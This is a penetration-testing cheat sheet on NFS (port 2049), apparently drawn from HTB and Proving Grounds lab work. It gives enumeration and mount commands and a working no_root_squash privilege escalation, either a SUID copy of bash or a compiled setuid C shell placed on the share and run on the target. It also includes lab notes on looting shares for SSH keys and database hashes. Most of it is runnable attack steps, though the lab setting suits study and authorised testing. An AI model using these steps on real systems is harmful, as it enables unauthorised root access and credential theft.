# NFS - Port 2049

## Show Exports

```bash
showmount -e $IP
```

## Mount

```bash
mkdir /tmp/nfs
sudo mount -t nfs $IP:/share /tmp/nfs
sudo mount -t nfs -o nolock $IP:/share /tmp/nfs

# Unmount when done
sudo umount /tmp/nfs
```

## Nmap

```bash
nmap --script nfs-ls,nfs-showmount,nfs-statfs -p 2049 $IP
```

## no_root_squash Privilege Escalation

If `no_root_squash` is set, root on your machine = root on the NFS share.

```bash
# 1. Mount the share as root
sudo mount -t nfs $IP:/share /tmp/nfs

# 2. Copy bash and set SUID
sudo cp /bin/bash /tmp/nfs/bash
sudo chmod +s /tmp/nfs/bash

# 3. On target as low-priv user
/share/bash -p
# -p REDACTED SUID privileges
```

Alternative with C SUID binary:

```bash
# On attacker
cat > shell.c << 'EOF'
#include <unistd.h>
int main() {
 setuid(0);
 setgid(0);
 system("/bin/bash -p");
 return 0;
}
EOF
gcc shell.c -o shell
sudo cp shell /tmp/nfs/
sudo chmod +s /tmp/nfs/shell

# On target
/share/shell
```

## Check Export Options

```bash
# On target (if you have shell)
cat /etc/exports
# Look for: no_root_squash, rw
```

## Tips

- NFS exports are often accessible to everyone if misconfigured.
- Check for SSH keys, config files, or writable directories.
- If `root_squash` is enabled (default), root is mapped to `nobody` - SUID trick won't work.
- NFS may require specific source port; use `-o port=2049` if needed.

## From Your Boxes

> **Remote** (HTB) - `showmount -e` revealed `/site_backups (everyone)`. Mounted the NFS share and found Umbraco `.sdf` database containing admin SHA1 hash. Cracked to `baconandcheese`, logged into Umbraco CMS for authenticated RCE.
> - What worked: `showmount -e TARGET_IP` then `sudo mount -t nfs TARGET_IP:/site_backups ~/mount/`
> - Lesson: NFS shares exporting backups are goldmines. Look for database files, config files, and credentials in mounted shares.

> **Sorcerer** (PG/Linux) - NFS (port 2049) was open alongside multiple other services. The NFS + HTTP combo provided user home directories and SSH keys needed for initial access.
> - What worked: NFS enumeration alongside other services
> - Lesson: When NFS is present, mount everything and look for SSH keys, configs, and writable directories.
